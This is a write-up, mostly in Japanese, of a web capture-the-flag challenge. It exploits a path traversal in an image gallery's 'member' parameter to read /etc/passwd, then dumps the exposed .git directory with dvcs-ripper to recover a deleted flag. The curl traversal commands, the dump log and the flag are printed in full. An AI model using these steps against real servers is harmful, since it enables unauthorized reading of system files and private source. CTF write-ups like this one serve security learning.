# Art Gallery:Web:100pts
bosh left his [image gallery](https://art-gallery.web.actf.co/) service running.... quick, git all of his secrets before he deletes them!!! [source](index.js)  

# Solution
アクセスすると画像を閲覧できるサイトのようだ。  
Angstrom Food Art Gallery  
[site.png](site/site.png)  
Foodを選ぶと`https://art-gallery.web.actf.co/gallery?member=aplet.jpg`のようなページにリダイレクトした。  
```bash
$ curl -s "https://art-gallery.web.actf.co/gallery?member=../../etc/passwd" | strings
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
~~~
```
ソースを見るまでもなく自明なパストラバーサルがわかる。  
ここから機密を探すようだが、問題文にgitとあるので、`.git`を狙う。  
```bash
$ curl -s "https://art-gallery.web.actf.co/gallery?member=../.git/HEAD" | strings
ref: refs/heads/master
```
一つ上に見つかった。  
[kost/dvcs-ripper](https://github.com/kost/dvcs-ripper)でダンプし、logを見てみる。  
```bash
$ git clone https://github.com/kost/dvcs-ripper.git
~~~
$ mkdir dump; cd dump
$ ../dvcs-ripper/rip-git.pl -v -u "https://art-gallery.web.actf.co/gallery?member=../.git/"
[i] Downloading git files from https://art-gallery.web.actf.co/gallery?member=../.git/
[i] Auto-detecting 404 as 200 with 3 requests
[i] Getting 200 as 404 responses. Adapting...
[i] Using session name: IPKgmFnO
[d] found COMMIT_EDITMSG
[d] found config
[d] found description
[d] found HEAD
[d] found index
[!] Not found for packed-refs: 404 as 200
[!] Not found for objects/info/alternates: 404 as 200
[!] Not found for info/grafts: 404 as 200
[d] found logs/HEAD
[d] found objects/56/449caeb7973b88f20d67b4c343cbb895aa6bc7
[d] found objects/71/3a4aba8af38c9507ced6ea41f602b105ca4101
[d] found objects/1c/584170fb33ae17a63e22456f19601efb1f23db
[d] found refs/heads/master
[!] Not found for: 404 as 200
[i] Running git fsck to check for missing items
Checking object directories: 100% (256/256), done.
error: 56e8e4282f1e92b8f9e7183771f73777fb3b78ef: invalid sha1 pointer in cache-tree
[d] found objects/3f/bb557e5558aec56295c7f57e2d53f451d776cc
[d] found objects/a5/b3c03785736215a4baa6740b5e595eac72ecc1
[d] found objects/8a/ba39c0cc9e4e4835796ff01b98c86b8bc81b01
[d] found objects/eb/8070196c48bf973d69f04aa6befea57a79641c
[d] found objects/4c/6c1591f1c1eac077042a3d5f37fa90c5bb4e0d
[d] found objects/ab/8ad5c7ab55aa2d66b9c4a9041f13e298a3c18f
[d] found objects/14/86c662205e9b59ec3a3203f22421d9a538f241
[d] found objects/56/e8e4282f1e92b8f9e7183771f73777fb3b78ef
[d] found objects/36/781365cafae93b3cd8dbc5450e62c0eb57aeea
[d] found objects/1b/9d0af53001a5c2a72c0c61d16d62403992800b
[d] found objects/ff/511529549e4a9376c897df27e001a909caa933
[i] Got items with git fsck: 11, Items fetched: 11
[i] Running git fsck to check for missing items
Checking object directories: 100% (256/256), done.
error: 5c1ff269bddd32dbe31722b499189947fbd8346a: invalid sha1 pointer in cache-tree
[d] found objects/78/0f864715099a7612efae3a3cdbccde05a0adc4
[d] found objects/5c/1ff269bddd32dbe31722b499189947fbd8346a
[i] Got items with git fsck: 2, Items fetched: 2
[i] Running git fsck to check for missing items
Checking object directories: 100% (256/256), done.
[i] Got items with git fsck: 0, Items fetched: 0
[!] No more items to fetch. That's it!
$ git log
commit 1c584170fb33ae17a63e22456f19601efb1f23db (HEAD -> master)
Author: imposter <sus@aplet.me>
Date:   Tue Apr 26 21:47:45 2022 -0400

    bury secrets

commit 713a4aba8af38c9507ced6ea41f602b105ca4101
Author: imposter <sus@aplet.me>
Date:   Tue Apr 26 21:44:48 2022 -0400

    remove vital secrets

commit 56449caeb7973b88f20d67b4c343cbb895aa6bc7
Author: imposter <sus@aplet.me>
Date:   Tue Apr 26 21:44:01 2022 -0400

    add program
```
secretsなるものを消しているようだ。  
checkoutして中身を見てやる。  
```bash
$ git checkout 56449caeb7973b88f20d67b4c343cbb895aa6bc7
~~~
$ ls
error.html  flag.txt  images  index.html  index.js  package-lock.json  package.json
$ cat flag.txt
actf{lfi_me_alone_and_git_out_341n4kaf5u59v}
```
flag.txtにflagが書かれていた。  

## actf{lfi_me_alone_and_git_out_341n4kaf5u59v}